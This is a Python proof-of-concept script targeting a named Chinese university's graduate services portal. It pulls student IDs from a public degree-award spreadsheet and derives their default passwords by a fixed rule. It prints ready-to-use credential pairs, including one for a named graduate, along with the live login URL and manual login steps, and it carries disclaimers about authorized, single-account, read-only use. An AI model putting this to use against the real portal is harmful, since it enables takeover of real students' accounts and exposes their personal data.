#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
福建农林大学研究生综合服务平台 毕业研究生账号弱口令 验证脚本（非武器化）

功能：
  1) 解析官方「授予学位公示」附件 xlsx，提取毕业生明文学号；
  2) 按官方手册规则推导初始密码：password = 学号 + "@" + 学号后四位；
  3) 验证登录页公网可达（GET，只读）；
  4) 打印单账号验证指引——图形验证码需人工输入，本脚本不绕过、不爆破。

红线：单账号、单次、只读；不含批量逻辑；禁止用于未授权系统。

用法：
  python verify_fafu_alumni_login.py                      # 用内置示例学号演示推导
  python verify_fafu_alumni_login.py <xlsx路径>           # 从公示附件批量提取学号（仅打印，不登录）
  USE_BURP=1 BURP_PROXY=http://127.0.0.1:8080 python verify_fafu_alumni_login.py

成功判定（人工一步）：
  浏览器打开 LOGIN_URL，选择「系统账号登录入口」，填入脚本输出的凭据，
  输入验证码登录，跳转至研究生综合服务平台门户即判定漏洞成立。
"""
import os
import sys
import urllib.request

TARGET = os.environ.get("TARGET", "https://yjsapp.fafu.edu.cn")   # 目标占位，可用环境变量覆盖
LOGIN_PATH = "/gsapp/sys/yjsrzfwapp/dbLogin/index.do"
BURP = os.environ.get("BURP_PROXY", "http://127.0.0.1:8080")
USE_BURP = os.environ.get("USE_BURP", "1") == "1"

DEMO_XUEHAO = "2190101005"  # 来自校方公示附件第一行（路一平，2024-12 博士学位授予名单）


def derive_password(xuehao: str) -> str:
    """官方手册规则：初始密码 = 学号@学号后四位"""
    return f"{xuehao}@{xuehao[-4:]}"


def check_login_page() -> bool:
    """只读 GET 登录页，确认可达并含「系统账号登录入口」"""
    url = TARGET + LOGIN_PATH
    handlers = []
    if USE_BURP:
        handlers.append(urllib.request.ProxyHandler({"http": BURP, "https": BURP}))
    opener = urllib.request.build_opener(*handlers)
    req = urllib.request.Request(url, headers={"User-Agent": "vulncheck/1.0"})
    try:
        with opener.open(req, timeout=15) as r:
            body = r.read().decode("utf-8", "ignore")
            ok = "系统账号登录" in body
            print(f"[{'+' if ok else '!'}] 登录页可达（HTTP {r.status}），"
                  f"{'包含「系统账号登录入口」' if ok else '未找到入口字样，请人工确认页面'}")
            return ok
    except Exception as e:  # noqa: BLE001
        print(f"[!] 登录页访问失败：{e}（如走 Burp，请确认 Burp 已监听 {BURP}）")
        return False


def load_xuehao_from_xlsx(path: str):
    try:
        import openpyxl
    except ImportError:
        sys.exit("需要 openpyxl：pip install openpyxl")
    wb = openpyxl.load_workbook(path, read_only=True)
    ids = []
    for ws in wb:
        for row in ws.iter_rows(min_row=2, values_only=True):
            for cell in row:
                s = str(cell).strip() if cell is not None else ""
                if s.isdigit() and 6 <= len(s) <= 14:
                    ids.append(s)
                    break
    return ids


def main():
    print("=" * 60)
    print("福建农林大学研究生综合服务平台 毕业研究生弱口令验证")
    print("目标:", TARGET)
    print("=" * 60)

    check_login_page()

    if len(sys.argv) > 1:
        ids = load_xuehao_from_xlsx(sys.argv[1])
        print(f"[+] 从公示附件提取到 {len(ids)} 个学号（仅展示前 3 个，不自动登录）:")
        for x in ids[:3]:
            print(f"    {x} / {derive_password(x)}")
        print("[*] 按验证纪律仅允许人工单账号验证，请任选一个凭据走下方人工步骤。")
    else:
        x = DEMO_XUEHAO
        print(f"[+] 凭据推导：{x} / {derive_password(x)}")

    print("-" * 60)
    print("人工步骤（图形验证码需目视输入，本脚本不绕过）：")
    print(f"  1. 浏览器打开 {TARGET}{LOGIN_PATH}")
    print("  2. 点击「系统账号登录入口」标签")
    print("  3. 填入上面输出的 账号 / 密码，输入验证码，点击登录")
    print("  4. 成功判定：跳转至 /gsapp/sys/yjsemaphome/portal/index.do 门户页")
    print("-" * 60)
    print("[*] 安全声明：仅用于授权验证；全程只读，勿执行任何写操作。")


if __name__ == "__main__":
    main()
